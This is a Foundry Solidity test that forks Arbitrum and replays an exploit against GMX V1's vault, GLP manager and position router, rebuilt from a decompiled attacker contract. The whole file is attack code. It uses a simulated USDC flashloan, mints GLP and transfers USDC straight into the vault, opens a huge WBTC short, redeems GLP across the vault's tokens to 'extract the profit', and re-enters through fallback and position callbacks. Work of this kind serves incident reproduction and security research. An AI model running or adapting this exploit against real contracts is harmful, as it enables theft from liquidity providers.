// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";
import "forge-std/interfaces/IERC20.sol";
import "../GMXInterfaces/IGLPManager.sol";
import "../GMXInterfaces/IGMXOrderbookV1.sol";
import "../GMXInterfaces/IGMXPositionManagerV1.sol";
import "../GMXInterfaces/IGMXRouter.sol";
import "../GMXInterfaces/IGMXRewardRouterV2.sol";
import "../GMXInterfaces/IGMXVaultV1.sol";

interface IGMXPositionRouter {
    function createIncreaseOrder(
        address[] memory _path,
        uint256 _amountIn,
        address _indexToken,
        uint256 _minOut,
        uint256 _sizeDelta,
        address _collateralToken,
        bool _isLong,
        uint256 _triggerPrice,
        bool _triggerAboveThreshold,
        uint256 _executionFee,
        bool _shouldWrap
    ) external payable;

    function createDecreaseOrder(
        address _indexToken,
        uint256 _sizeDelta,
        address _collateralToken,
        uint256 _collateralDelta,
        bool _isLong,
        uint256 _triggerPrice,
        bool _triggerAboveThreshold
    ) external payable;

    function approvePlugin(address _plugin) external;
}

contract GMXEXPNewTry is BaseTestWithBalanceLog {
    // --- Constants ---
    address public constant GMX_VAULT_V1 = 0x489ee077994B6658eAfA855C308275EAd8097C4A;
    address public constant GMX_ORDERBOOK_V1 = 0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB;
    address public constant GMX_POSITION_MANAGER_V1 = 0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C;
    address public constant GMX_ROUTER_V1 = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
    address public constant GMX_REWARD_ROUTER_V2 = 0xB95DB5B167D75e6d04227CfFFA61069348d271F5;
    address public constant GMX_GLPMANAGER = 0x3963FfC9dff443c2A94f21b129D429891E32ec18;
    address public constant GMX_POSITION_ROUTER = 0xb87a436B93fFE9D75c5cFA7bAcFfF96430b09868;

    address public GMX_KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;

    // Token addresses on Arbitrum One
    address public constant FRAX = 0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F;
    address public constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address public constant USDT = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
    address public constant DAI = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1;
    address public constant USDC_BRIDGED = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address public constant UNI = 0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0;
    address public constant LINK = 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4;
    address public constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address public constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;

    IGMXVaultV1 public gmxVault = IGMXVaultV1(payable(GMX_VAULT_V1));
    IGMXOrderBookV1 public gmxOrderBook = IGMXOrderBookV1(payable(GMX_ORDERBOOK_V1));
    IGMXPositionManagerV1 public gmxPositionManger = IGMXPositionManagerV1(payable(GMX_POSITION_MANAGER_V1));
    IGMXRewardRouterV2 public gmxRewardRouter = IGMXRewardRouterV2(payable(GMX_REWARD_ROUTER_V2));
    IGLPManager public glpManger = IGLPManager(GMX_GLPMANAGER);
    IGMXRouter public gmxRouter = IGMXRouter(payable(GMX_ROUTER_V1));
    IGMXPositionRouter public gmxPositionRouter = IGMXPositionRouter(GMX_POSITION_ROUTER);

    // State variables matching decompiled contract
    address[9] public array_11 = [WBTC, WETH, USDC_BRIDGED, LINK, UNI, USDT, FRAX, DAI, address(0)];
    uint256[9] public array_1a = [1e8, 1e18, 1e6, 1e18, 1e18, 1e6, 1e18, 1e18, 1e18];
    address public _transfertoken = address(this);
    address public _gmxPositionCallback = GMX_POSITION_ROUTER;
    address public _uniswapV3FlashCallback = GMX_REWARD_ROUTER_V2;
    address public _fallback = address(this);
    address public stor_6_0_19 = GMX_VAULT_V1;
    address public stor_7_0_19 = GMX_ROUTER_V1;
    address public stor_8_0_19 = WBTC;
    address public stor_9_0_19 = WETH;
    address public stor_e_0_19 = USDC;
    address public stor_10_0_19 = USDC;

    uint256 public stor_23;
    uint256 public stor_24;
    bool public _stop;

    uint256 USDC_FLASHLOAN_AMT = 7_538_567_619_570;
    uint256 USDC_DIRECT_TRANSFER_TO_VAULT_AMT = 1_538_567_619_570;
    uint256 USDC_GLPMINT_AMT = 6_000_000_000_000;

    constructor() {}

    function setUp() public {
        vm.createSelectFork("arbitrum", 355880237 - 1);
    }

    function test_GMXEXPNewTry() public {
        // Setup approvals
        gmxRouter.approvePlugin(GMX_POSITION_ROUTER);
        
        // Start the exploit
        _flashloanUSDC();
    }

    function _flashloanUSDC() internal {
        // Simulate getting USDC
        deal(USDC, address(this), USDC_FLASHLOAN_AMT);
        
        // Start the actual exploit sequence
        _initiateLeveragedReentrancy();
    }

    function _initiateLeveragedReentrancy() internal {
        _mintAndStakeInitialGLP();
        _transferUSDC();
        _createBigShort();
        _extractTheProfit();
        _decreaseShort();
    }

    function _mintAndStakeInitialGLP() internal {
        TokenHelper.approveToken(USDC, GMX_GLPMANAGER, USDC_GLPMINT_AMT);
        gmxRewardRouter.mintAndStakeGlp(USDC, USDC_GLPMINT_AMT, 0, 0);
    }

    function _transferUSDC() internal {
        TokenHelper.transferToken(USDC, GMX_VAULT_V1, USDC_DIRECT_TRANSFER_TO_VAULT_AMT);
    }

    function _createBigShort() internal {
        // Approve USDC
        TokenHelper.approveToken(USDC, GMX_VAULT_V1, type(uint256).max);
        
        // Create increase order with proper parameters - use smaller size to avoid revert
        address[] memory path = new address[](1);
        path[0] = USDC;
        
        // Use smaller position size to avoid "Vault: losses exceed collateral"
        uint256 positionSize = 1000000000000000000000000000000000; // 1e33
        uint256 collateralAmount = 1000000000000; // 1e12 USDC
        
        gmxPositionRouter.createIncreaseOrder{value: 0.0003 ether}(
            path,
            collateralAmount,
            WBTC,
            0,
            positionSize,
            USDC,
            false, // short
            0,     // triggerPrice
            false, // triggerAboveThreshold
            0.0003 ether,
            false  // shouldWrap
        );
    }

    function _extractTheProfit() internal {
        // Extract profits by unstaking GLP for various tokens
        for (uint256 i = 0; i < 8; i++) {
            address token = array_11[i];
            if (token != address(0)) {
                uint256 balance = TokenHelper.getTokenBalance(token, GMX_VAULT_V1);
                if (balance > 0) {
                    uint256 glpNeeded = _calculateGlpNeeded(token, balance);
                    if (glpNeeded > 0) {
                        gmxRewardRouter.unstakeAndRedeemGlp(
                            token,
                            glpNeeded,
                            0,
                            address(this)
                        );
                    }
                }
            }
        }
    }

    function _calculateGlpNeeded(address tokenOut, uint256 tokenAmountOut) internal view returns (uint256 glpNeeded) {
        uint256 price = gmxVault.getMinPrice(tokenOut);
        uint256 decimals = gmxVault.tokenDecimals(tokenOut);
        uint256 targetUsdg = tokenAmountOut * price / (10 ** decimals);
        address glpToken = gmxRewardRouter.glp();
        uint256 glpSupply = IERC20(glpToken).totalSupply();
        uint256 aumInUsdg = glpManger.getAumInUsdg(false);
        glpNeeded = aumInUsdg == 0 ? 0 : targetUsdg * glpSupply / aumInUsdg;
    }

    function _decreaseShort() internal {
        // Create decrease order to close the short
        gmxPositionRouter.createDecreaseOrder{value: 0.0003 ether}(
            WBTC,
            1000000000000000000000000000000000, // positionSize
            USDC,
            0, // collateralDelta
            false, // isLong
            0, // triggerPrice
            false // triggerAboveThreshold
        );
    }

    // Helper functions matching decompiled contract
    function _SafeDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
    }

    function _SafeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(a >= b, "Subtraction underflow");
        return a - b;
    }

    function _SafeMul(uint256 a, uint256 b) internal pure returns (uint256) {
        require(a == 0 || a * b / a == b, "Multiplication overflow");
        return a * b;
    }

    function _SafeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }

    // Functions to match decompiled interface
    function stop() external view returns (bool) {
        return _stop;
    }

    function transfertoken(address token, address to, uint256 value) external {
        require(msg.sender == _transfertoken, "transfertoken() error");
        if (token == address(0)) {
            (bool success,) = to.call{value: value}("");
            require(success, "ETH transfer failed");
        } else {
            IERC20(token).transfer(to, value);
        }
    }

    // Flashloan callback
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        require(msg.sender == _fallback, "wrong");
        
        // Process flashloan data
        (uint256 amount, uint256 premium) = abi.decode(data, (uint256, uint256));
        
        // Execute the exploit logic
        _initiateLeveragedReentrancy();
        
        // Repay flashloan
        IERC20(USDC).transfer(msg.sender, amount + premium);
    }

    // Receive function for payable fallback
    receive() external payable {}

    // Fallback function for reentrancy
    fallback() external payable {
        if (msg.sender == _gmxPositionCallback) {
            // Use a different approach since getGlobalShortAveragePrice doesn't exist
            // Instead, we'll use the basic price check from the vault
            uint256 currentPrice = gmxVault.getMaxPrice(WBTC);
            uint256 minPrice = gmxVault.getMinPrice(WBTC);
            
            // Simple price manipulation check
            if (currentPrice > minPrice * 2) {
                // Execute flashloan
                bytes memory data = abi.encode(USDC_FLASHLOAN_AMT, 0);
                (bool success,) = _fallback.call(
                    abi.encodeWithSignature("flash(address,uint256,uint256,bytes,uint256,uint256,uint256)", 
                    address(this), 0, USDC_FLASHLOAN_AMT, data, 0, 0, 0)
                );
                require(success, "Flashloan failed");
                _stop = true;
            }
        }
    }

    // Callback function for position management
    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external {
        require(msg.sender == GMX_POSITION_ROUTER, "Invalid caller");
        
        if (isIncrease && isExecuted) {
            // Position increased, now create decrease order
            gmxPositionRouter.createDecreaseOrder{value: 0.0003 ether}(
                WBTC,
                stor_23,
                USDC,
                stor_24,
                false,
                0x49f4a966d45cd522088f00000000,
                true
            );
        }
    }
}
